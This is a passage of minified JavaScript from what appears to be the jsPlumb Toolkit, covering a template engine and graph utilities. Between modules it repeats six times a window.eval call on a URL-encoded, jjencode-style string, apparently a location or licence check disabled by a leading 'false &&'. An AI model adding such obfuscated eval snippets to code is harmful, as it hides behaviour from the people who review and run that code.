e,n="",o="",i=this.happyFlowChildren||this.children;for(e=0;e<i.length;e++)n+=i[e].compile(t)+";";if(null!=this.happyFlowChildren){for(o="else {",e=0;e<this.children.length;e++)o+=this.children[e].compile(t)+";";o+="}"}return";with (data[0]) { if("+this.test+") { "+n+" }"+o+"}"}},"r-else":{remove:!0,parse:function(t,e,n,o,i){var r=v.peek(i);null!=r&&"r-if"===r.tag&&(r.happyFlowChildren=r.children,r.children=[])},compile:function(t){}},"r-for":{parse:function(t,e,n,o,i){t.loop=t.atts.loop},compile:function(t){var e="";e+="var __limit; with(data[0]){__limit=("+this.loop+");}",e+="for(var $index=0;$index<__limit;$index++){data[0].$index=$index;";for(var n=0;n<this.children.length;n++)e+=this.children[n].compile(t)+";";return e+"}delete data[0].$index;"}},"r-tmpl":{remove:!0,parse:function(t,e,n,o,i,r){if(t.type="template",t.context=t.atts.context,t.atts.lookup)t.lookup=t.atts.lookup,t.default=t.atts.default||"",t.compile=function(e){return';with(data[0]){var tlid=eval("'+t.lookup.replace(/[\$\{\}]/g,"")+'");}if (_rotors.templateCache[tlid] == null){var ___t = _rotors.templateResolver(tlid) || _rotors.templateResolver("'+t.default+'");_rotors.templateCache[tlid]=_rotors.compile(_rotors.parse(___t));} eval(_rotors.templateCache[tlid].functionBody);'};else{t.templateId=t.atts.id;var s=function(t){if(null==t||0===t.length)return!1;for(var e=t.length-1;e>-1;e--)if("each"===t[e].type)return!0;return!1}(i);if(-1!==r.indexOf(t.templateId)){if(!s)throw new TypeError("recursive template call ["+t.templateId+"]");t.compile=function(e){return";eval(_rotors.templateCache['"+t.templateId+"'].functionBody);"}}else{var a=n(t.templateId);r.push(t.templateId);var l=o.parse(a,n,null,r);null==o.templateCache[t.templateId]&&(o.templateCache[t.templateId]=o.compile(l));for(var d=0;d<l.length;d++)l[d].context=t.context;o.debug("nested ast",l),t.children=l,r.pop()}}},precompile:function(t){return this.context?';data.unshift(_rotors.data(data[0], "'+this.context+'"));':""},postcompile:function(t){return this.context?";data.splice(0, 1);":""}},"r-html":{parse:function(t,e,n,o){},compile:function(t){try{return";var __hp=_rotors.parse(data[0]."+this.children[0].bindings.__element.e[0][1]+"),__hc=_rotors.compile(__hp,true);var __f=__hc(data[0], _rotors);Rotors.peek(_els).appendChild(__f.childNodes[0]);"}catch(e){return t.maybeDebug("Could not find key to bind for r-html element. Should be in the form <r-html>${key}</r-html> ('key' can be anything)"),""}}}},globalTags:{},registerTag:function(t,e,n){this[n?"globalTags":"customTags"][t]=new function(t,e,n){var i=function(e,n){for(var i=[],r=0;r<e.length;r++){var s=o({},e[r]);i.push(s),o(s.atts,n.atts,function(e,n){c(e,n,s,null,t)})}return i}.bind(this);this.template=n.template,this.getFunctionBody=function(e){return t.compile(i(t.parse(n.template,null,{originalCustomTag:e.tag,context:e.context}),e),!1,!0,!0)}.bind(this),this.getFunctionEnd=function(){return";_els.pop();"},this.rendered=n.rendered||function(){},this.updated=n.updated||function(){}}(this,t,e)},setAttribute:function(t,e,n){var o=e.split(":");1===o.length||null==this.namespaces[o[0]]?t.setAttribute(o[0],n):t.setAttributeNS(this.namespaces[o[0]],o[1],n)},setToggleManager:function(t){this.toggleManager=t},debugEnabled:!1,debug:function(){this.debugEnabled&&console.log.apply(console,arguments)},maybeDebug:function(){this.debugEnabled&&arguments[0]&&console.log.apply(console,arguments)},parse:function(t,e,n,o){o=o||[],e=_(this,e||this.templateResolver,null);var i=[],r=[],s=function(){return i.length>0?i[i.length-1]:null},a=function(t,e){i.length>0&&s().children.push(t),e?0==i.length&&r.push(t):i.push(t)},l=function(){var t=i.pop();if(0!==i.length||t.discard){if(t.discard){var e=v.peek(i);e&&e.children.pop()}}else r.push(t);return t},c=function(t,e,n,o,r){var s=new f(t,o),a=o.customElements[s.tag];return a&&(a.parse(s,e,n,o,i,r),a.compile&&(s.compile=a.compile),s.precompile=a.precompile,s.postcompile=a.postcompile,s.custom=!0,s.remove=a.remove,o.debug("  element is a custom element"),o.maybeDebug(s.remove,"  element's root should not appear in output")),s},g=[{re:this.commentRe,handler:function(t,e,n,o){o.debug("comment",t,e),a(new function(t){this.uuid=h(),this.comment=t,this.compile=function(){return""}}(t),!0)}},{re:this.openRe,handler:function(t,e,n,o,i){o.debug("open element",t,e);var r=c(t,e,n,o,i);a(r,r.remove)}},{re:this.closeRe,handler:function(t,e,n,o){o.debug("close element",t,e);var i,r,a=o.customElements[e[1]];if(null==a||!a.remove){if(i=e[1],null==(r=s())||r.tag!=i)throw new TypeError("Unbalanced closing tag '"+e[1]+"'; opening tag was '"+l().tag+"'");l()}}},{re:this.openCloseRe,handler:function(t,e,n,o,i){o.debug("open and close element",t,e);var r=c(t,e,n,o,i);a(r,!0)}},{re:/.*/,handler:function(t,e,n,o){o.debug("text node",t);var i=new function(t,e){p.apply(this,arguments),this.value=t.value,this.type="text",this.bindings={};var n=function(){return"_rotors.bind(data[0], '"+this.bindings.__element.u+"', typeof $key !== 'undefined' ? $key : null, typeof $value !== 'undefined' ? $value : null)"}.bind(this);this.compile=function(t){return t.getExecutionContent(n(),this.uuid,!0)+";_rotors.pet(_eid, '"+this.uuid+"');"},this.update=function(t,e){t.nodeValue=this.bindings.__element.reapply(e)}}({value:t},o);a(i,!0),u("__element",t,i,null,o)}}];if(function(t,e){for(var n=0;n<t.length;n++){var o=t[n];null!=o&&0!==o.length&&e(n,o)}}(d(t).split(this.tokenizerRe),function(t,n){for(var i=d(n),r=0;r<g.length;r++){var s=(a=i,l=g[r].re,void 0,null!=(u=a.match(l))&&u);if(s){g[r].handler(n,s,e,this,o);break}}var a,l,u}.bind(this)),r.length>0&&n)for(var b in n)r[0][b]=n[b];return r},compile:function(t,e,n,o){for(var i=[],r=0;r<t.length;r++){var s="";t[r].precompile&&(s+=t[r].precompile(this)),s+=t[r].compile(this,o),t[r].postcompile&&(s+=t[r].postcompile(this)),i.push(s)}var a=i.join("");if(this.debug("function body :",a),n)return a;var l=new Function("data,_rotors","data=[data||{}];var frag=_rotors.cf(),_els=[],e,_le,__a,$value,$key,_eid = _rotors.nec();_els.push(frag);"+a+"return frag;"),d=this;if(e)return l;var u=function(t){return l.apply(this,[t,d])};return u.functionBody=a,u},nec:function(){var t=this.uuid();return this.executions[t]={current:[{children:[]}]},t},te:function(t,e,n,o){var i={el:t,children:[],id:n,index:o};this.executions[e].current[0].children.push(i);var r=n+(null!=o?"-"+o:"");this.executions[e][r]=i,this.executions[e].current.unshift(i)},pet:function(t,e){this.executions[t].current=this.executions[t].current.splice(1)},getExecutionContent:function(t,e,n,o,i){return(null!=o?this.namespaceHandlers[o](t):n?"e=_rotors.ctn("+t+");":"e=_rotors.ce('"+t+"');")+"Rotors.peek(_els).appendChild(e);"+(n?"":"_els.push(e);")+"e._rotors=_rotors.entries['"+e+"'];e._rotorsEid=_eid;if(typeof _rotorsLoopId !== 'undefined') {e._rotorsLoopId=_rotorsLoopId;e._rotorsLoopIndex=_rotorsLoopIndex;e._rotorsLoopContext=_rotorsLoopContext;}_rotors.te(e, _eid, '"+e+"', typeof _rotorsLoopIndex != 'undefined' ? _rotorsLoopIndex : null);"},updaters:{},onUpdate:function(t,e){if(null!=t._rotors){var n=t._rotors.instance;t._RotorsUpdate=t._RotorsUpdate||h(),n.updaters[t._RotorsUpdate]=n.updaters[t._RotorsUpdate]||[],n.updaters[t._RotorsUpdate].push(e)}},update:function(t,e){var n,o,i,r=[],s=t._rotorsEid;if(null!=s&&null!=t._rotors){n=(i=t._rotors.instance).executions[s];var a=t._rotorsLoopIndex;o=n[t._rotors.uuid+(null!=a?"-"+a:"")];var l=function(t,e,n){null!=t&&(t._rotors.update(t,e),t._RotorsUpdate&&i.updaters[t._RotorsUpdate]&&r.push([t,i.updaters[t._RotorsUpdate],e]));for(var o=0;o<n.children.length;o++){var s=i.entries[n.children[o].id],a="each"===i.entries[n.id].type&&null!=n.children[o].el&&null!=n.children[o].el._rotorsLoopIndex?e[n.children[o].el._rotorsLoopIndex]:i.data(e,s.context);l(n.children[o].el,a,n.children[o])}};l(t,e,o);for(var d=0;d<r.length;d++)for(var u=r[d],c=0;c<u[1].length;c++)try{u[1][c](u[0],u[2])}catch(t){}}},updateExternal:function(t,e){e=e||{};var n,o,r,s=function(t){if(t.nodeType===Node.ELEMENT_NODE){for(var a=0,l=t.attributes.length;a<l;a++)n=t.attributes[a],"rotors"===n.name?(o=n.value,t.innerHTML=i(e,o)):0===n.name.indexOf("rotors-")&&(o=n.value,r=n.name.substring(7),t.setAttribute(r,i(e,o)));for(a=0;a<t.childNodes.length;a++)s(t.childNodes[a])}};s(t)},remove:function(t){t._RotorsUpdate&&this.updaters[t._RotorsUpdate]&&delete this.updaters[t._RotorsUpdate],t._rotorsEid&&this.executions[t._rotorsEid]&&delete this.executions[t._rotorsEid]},template:function(t,e,n,o){var i,r=o?null:this.templateCache[t];if(null!=r)return i=r(e),this.isOldIE()?i.childNodes[0]:i;var s=(n=_(this,n||this.templateResolver,o))(t);if(null!=s){var a=this.parse(s,n,null,[t]),l=this.compile(a);return this.templateCache[t]=l,i=l(e),this.isOldIE()?i.childNodes[0]:i}return this.cf()},precompileTemplate:function(t,e){var n=this.parse(t,e||this.templateResolver);return this.compile(n,!0)},precompileTemplates:function(t,e){var n=function(n){return t[n]||(e||this.templateResolver)(n)},o={};for(var i in t)o[i]=this.precompileTemplate(t[i],n);return o},importTemplate:function(t,e){var n=this;e="string"==typeof e?Function("data","_rotors",e):e,this.templateCache[t]=function(t){return e.apply(n,[t,n])}},importTemplates:function(t){for(var e in t)this.importTemplate(e,t[e])},importBindings:function(t){this.bindings=this.bindings||{};for(var e in t){var n=t[e];this.bindings[e]={e:n.e,u:n.u,w:n.w,reapply:Function("$data",n.reapply)}}}});var v=t.Rotors={newInstance:function(t){return new b(t)},precompile:function(e,n){n=n||"rotors";var o=t.Rotors.newInstance(),i={},r=new RegExp("<script type=['\"]"+n+"['\"] id=['\"]([^'\"]+)['\"]>((.*\n)*?)<\/script>","g"),s=[{},null,e.replace(r,function(t,e,n){return i[e]=n,""})];for(var a in i)s[0][a]=String(o.precompileTemplate(i[a],function(t){return i[t]})).replace(/^function\s*\S+\s*\([^)]*\)\s*\{|\}$/g,"");return s[1]=function(t){var e={};for(var n in t.bindings){var o=t.bindings[n];e[n]={e:o.e,u:o.u,w:o.w,reapply:String(o.reapply).replace(/^function\s*\S+\s*\([^)]*\)\s*\{|\}$/g,"")}}return e}(o),s},data:i,version:"0.3.17",peek:function(t){return t.length>0?t[t.length-1]:null}};"undefined"!=typeof exports&&(exports.Rotors=v,exports.RotorsInstance=b)}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){var t=this;t.jsPlumbToolkitUtil=t.jsPlumbToolkitUtil||{};var e,n,o=t.jsPlumbToolkitUtil;o.requestAnimationFrame=(e=t.requestAnimationFrame||t.webkitRequestAnimationFrame||t.mozRequestAnimationFrame||t.oRequestAnimationFrame||t.msRequestAnimationFrame||function(e,n){t.setTimeout(e,10)},n=t,function(){return e.apply(n,arguments)}),o.ajax=function(t){var e=window.XMLHttpRequest?new XMLHttpRequest:new ActiveXObject("Microsoft.XMLHTTP"),n=t.type||"GET";if(e){var o="json"===t.dataType?function(t){return JSON.parse(t)}:function(t){return t};e.open(n,t.url,!0);var i=t.headers||{};for(var r in i)e.setRequestHeader(r,i[r]);e.onreadystatechange=function(){4===e.readyState&&("2"===(""+e.status)[0]?t.success(o(e.responseText)):t.error&&t.error(e.responseText,e.status))},e.send(t.data?JSON.stringify(t.data):null)}else t.error&&t.error("ajax not supported")},o.debounce=function(t,e){e=e||150;var n=null;return function(){window.clearTimeout(n),n=window.setTimeout(t,e)}},o.xml={setNodeText:function(t,e){t.text=e;try{t.textContent=e}catch(t){}},getNodeText:function(t){return null!=t?t.text||t.textContent:""},getChild:function(t,e){for(var n=null,o=0;o<t.childNodes.length;o++)if(1===t.childNodes[o].nodeType&&t.childNodes[o].nodeName===e){n=t.childNodes[o];break}return n},getChildren:function(t,e){for(var n=[],o=0;o<t.childNodes.length;o++)1===t.childNodes[o].nodeType&&t.childNodes[o].nodeName===e&&n.push(t.childNodes[o]);return n},xmlToString:function(t){try{return(new XMLSerializer).serializeToString(t).replace(/\s*xmlns=\"http\:\/\/www.w3.org\/1999\/xhtml\"/g,"")}catch(e){try{return t.xml}catch(t){throw new Error("Cannot serialize XML "+t)}}},createElement:function(t,e,n){var o;try{o=new ActiveXObject("Microsoft.XMLDOM").createNode(1,t,"")}catch(e){o=document.createElement(t)}if(n&&jsPlumbToolkitUtil.xml.setNodeText(o,n),e)for(var i in e)o.setAttribute(i,e[i]);return o}}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){"use strict";this.jsPlumbToolkitUtil=this.jsPlumbToolkitUtil||{};var t=this.jsPlumbToolkitUtil,e=this.jsPlumbUtil;t.fastTrim=function(t){for(var e=t.replace(/^\s\s*/,""),n=/\s/,o=e.length;n.test(e.charAt(--o)););return e.slice(0,o+1)},t.uuid=function(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(t){var e=16*Math.random()|0;return("x"==t?e:3&e|8).toString(16)})},t.each=function(t,e){t=null==t.length||"string"==typeof t?[t]:t;for(var n=0;n<t.length;n++)e(t[n])},t.map=function(t,e){for(var n=[],o=0;o<t.length;o++)n.push(e(t[o]));return n},t.populate=function(t,n){var o=function(t){if(null!=t){if(e.isString(t))return function(t){var e=t.match(/(\${.*?})/g);if(null!=e)for(var o=0;o<e.length;o++){var i=n[e[o].substring(2,e[o].length-1)];i&&(t=t.replace(e[o],i))}return t}(t);if(e.isArray(t)){for(var i=[],r=0;r<t.length;r++)i.push(o(t[r]));return i}if(e.isObject(t)){i={};for(var r in t)i[r]=o(t[r]);return i}return t}};return o(t)},t.mergeWithParents=function(t,n,o){o=o||"parent";var i=function(t){return t?n[t]:null},r=function(t){return t?i(t[o]):null},s=function(t,n){if(null==t)return n;var o=e.merge(t,n);return s(r(t),o)},a=function(t){if(null==t)return{};if("string"==typeof t)return i(t);if(t.length){for(var e,n=!1,o=0;!n&&o<t.length;)e=a(t[o]),e?n=!0:o++;return e}},l=a(t);return l?s(r(l),l):{}},"undefined"!=typeof exports&&(exports.jsPlumbToolkitUtil=t)}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){var t=this.jsPlumb,e=this.jsPlumbUtil,n="startNodeTraversal",o="endNodeTraversal",i="startOverlayAnimation",r="endOverlayAnimation",s="jtk-animate-node-traversing",a="jtk-animate-edge-traversing";t.Connection.prototype.animateOverlay=function(l,d){var u=this,c=new e.EventGenerator,h=u.getConnector().getLength();d=d||{};var p,f,g,_=e.uuid(),b=!1!==d.forwards,v=d.rate||30,m=d.dwell||250,w=1/(h/(d.speed||100)*1e3/v)*(b?1:-1),j=!1!==d.isFinal,y=b?0:1,P=y,E=b?u.source:u.target,x=b?u.target:u.source;if("string"==typeof l)g=[l,{location:y,id:_}];else{var C=t.extend({},l[1]);C.location=y,C.id=_,g=[l[0],C]}var S=function(){P+=w,(b?P>=1:P<=0)?(u.removeOverlay(_),window.clearInterval(p),j?(t.addClass(x,s),window.setTimeout(function(){t.removeClass(x,s),u.removeClass(a),c.fire(r,u)},m)):(u.removeClass(a),c.fire(r,u))):(f.loc=P,u.repaint())},I=function(){c.fire(n,{connection:u,element:E}),t.addClass(E,s),u.addClass(a),window.setTimeout(function(){t.removeClass(E,s),c.fire(o,{connection:u,element:E}),c.fire(i,u),f=u.addOverlay(g),p=window.setInterval(S,v)},m)};return d.previous?d.previous.bind(r,I):I(),c}}.call("undefined"==typeof window?this:window),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){"use strict";var t=["node","port","edge","group"],e=["Added","Removed","Updated","Moved"],n=["edge"],o=["Source","Target"],i=function(t,e,n,o){for(var i=0;i<t.length;i++)for(var r=0;r<e.length;r++)n.bind(t[i]+e[r],o)};this.jsPlumbToolkitUtil.AutoSaver=function(r,s,a,l,d,u,c){function h(t){return function(){t&&t.apply(t,arguments),c&&c()}}var p=!1,f=function(){if(!p){try{u&&u()}catch(t){}r.save({url:s,success:h(l),error:h(d),headers:a})}};r.bind("dataLoadStart",function(){p=!0}),r.bind("dataLoadEnd",function(){p=!1}),r.bind("graphClearStart",function(){p=!0}),r.bind("graphCleared",function(){p=!1}),i(t,e,r,f),i(n,o,r,f)},this.jsPlumbToolkitUtil.CatchAllEventHandler=function(r){var s=function(){r.fire("dataUpdated")};i(t,e,r,s),i(n,o,r,s)}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){var t=this.jsPlumbToolkitUtil,e=this.jsPlumbUtil;t.Selection=function(n){e.EventGenerator.apply(this,arguments);var o,i=n.toolkit,r=[],s=[],a=[],l=Math.Infinity,d=Math.Infinity,u=Math.Infinity,c=n.generator,h={},p=this,f=n.onClear||function(){},g=function(t){return"Edge"===t.objectType?a:"Node"===t.objectType?r:s},_=function(t,e){var n=t.objectType.toLowerCase()+e,o={Group:{data:t.data,group:t},Node:{data:t.data,node:t},Port:{data:t.data,node:t.node,port:t},Edge:{data:t.data,edge:t}};p.fire(n,o[t.objectType])};this.getModel=i.getModel,this.setSuspendGraph=i.setSuspendGraph,this.getNodeId=i.getNodeId,this.getGroupId=i.getNodeId,this.getEdgeId=i.getEdgeId,this.getPortId=i.getPortId,this.getNodeType=i.getNodeType,this.getGroupType=i.getNodeType,this.getEdgeType=i.getEdgeType,this.getPortType=i.getPortType,this.getObjectInfo=i.getObjectInfo,this.isDebugEnabled=i.isDebugEnabled;var b=function(e,n){if(!h[e.getFullId()]){var i=function(e){var n=[],i=g(e),r="Edge"===e.objectType?d:"Node"===e.objectType?l:u;if(i.length>=r){if(o===t.Selection.DISCARD_NEW)return!1;n=i.splice(0,1),_(n[0],"Removed"),delete h[n[0].getFullId()]}return i.push(e),_(e,"Added"),n}(e);return!1===i?[[],[]]:(h[e.getFullId()]=e,n&&n(e,!0),[[e],i])}return[[],[]]},v=function(t,n){return e.removeWithFunction(g(t),function(e){return e.id==t.id})&&_(t,"Removed"),delete h[t.getFullId()],n&&n(t,!1),[[],[]]},m=function(t,e){return h[t.getFullId()]?v(t,e):b(t,e)},w=function(t,n,o){var r,s=[],a=[];if(null==t)return s;var l=function(t){var d;if(e.isString(t))null!=(d=i.getNode(t)||i.getEdge(t)||i.getGroup(t))&&(r=n(d,o),s.push.apply(s,r[0]),a.push.apply(a,r[1]));else if(t.eachNode&&t.eachEdge)t.eachNode(function(t,e){l(e)}),t.eachEdge(function(t,e){l(e)}),t.eachGroup&&t.eachGroup(function(t,e){l(e)});else if(t.each)t.each(function(t,e){l(e.vertex||e)});else if(null!=t.length)for(var u=0;u<t.length;u++)l(t[u],o);else r=n(t,o),s.push.apply(s,r[0]),a.push.apply(a,r[1])};return l(t),[s,a]}.bind(this);i.bind("nodeRemoved",function(t){v(t.node)}),i.bind("groupRemoved",function(t){v(t.group)}),i.bind("portRemoved",function(t){v(t.port)}),i.bind("edgeRemoved",function(t){v(t.edge)}),i.bind("edgeTarget",function(t){h[t.edge.getFullId()]&&p.fire("edgeTarget",t)}),i.bind("edgeSource",function(t){h[t.edge.getFullId()]&&p.fire("edgeSource",t)}),i.bind("nodeUpdated",function(t){h[t.node.getFullId()]&&p.fire("nodeUpdated",t)}),i.bind("groupUpdated",function(t){h[t.group.getFullId()]&&p.fire("groupUpdated",t)}),i.bind("edgeUpdated",function(t){h[t.edge.getFullId()]&&p.fire("edgeUpdated",t)}),i.bind("portUpdated",function(t){h[t.port.getFullId()]&&p.fire("portUpdated",t)}),this.remove=function(t,e){return w(t,v,e)},this.append=function(t,e){return w(t,b,e)},this.toggle=function(t,e){return w(t,m,e)},this.setMaxNodes=function(t){l=t},this.setMaxEdges=function(t){d=t},this.setCapacityPolicy=function(t){o=t},this.clear=function(t){r.length=0,a.length=0,s.length=0,h={},t||f(this)},this.reload=function(){if(null!=c){var t;for(this.clear(),this.fire("dataLoadStart"),c(this,i),t=0;t<s.length;t++)p.fire("groupAdded",s[t]);for(t=0;t<r.length;t++)p.fire("nodeAdded",r[t]);for(t=0;t<a.length;t++)p.fire("edgeAdded",a[t]);this.fire("dataLoadEnd")}},this.each=function(t,n){for(var o="Edge"===n?a:"Group"===n?s:r,i=0;i<o.length;i++)try{t(i,o[i])}catch(t){e.log("Selection iterator function failed",t)}},this.eachNode=this.each,this.eachGroup=function(t){this.each(t,"Group")},this.eachNodeOrGroup=function(t){this.each(t,"Node"),this.each(t,"Group")},this.eachEdge=function(t){this.each(t,"Edge")},this.getNodeCount=function(){return r.length},this.getNodeAt=function(t){return r[t]},this.getNodes=function(){return r},this.getNode=i.getNode,this.getGroupAt=function(t){return s[t]},this.getGroups=function(){return s},this.getGroup=i.getGroup,this.getGroupCount=function(){return s.length},this.getAll=function(){var t=[];return Array.prototype.push.apply(t,r),Array.prototype.push.apply(t,a),Array.prototype.push.apply(t,s),t},this.getAllEdgesFor=function(t){for(var e=t.getAllEdges(),n=[],o=0;o<e.length;o++)null!=h[e[o].getId()]&&n.push(e[o]);return n},this.getEdgeCount=function(){return a.length},this.get=this.getNodeAt=function(t){return r[t]},this.getEdge=this.getEdgeAt=function(t){return a[t]},this.getEdges=function(){return a},this.setCapacityPolicy(t.Selection.DISCARD_EXISTING)},t.Selection.DISCARD_EXISTING="discardExisting",t.Selection.DISCARD_NEW="discardNew"}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){"use strict";var t=this.jsPlumbGraph={};t.version="0.1",t.name="jsPlumbGraph";var e=function(t,e){var 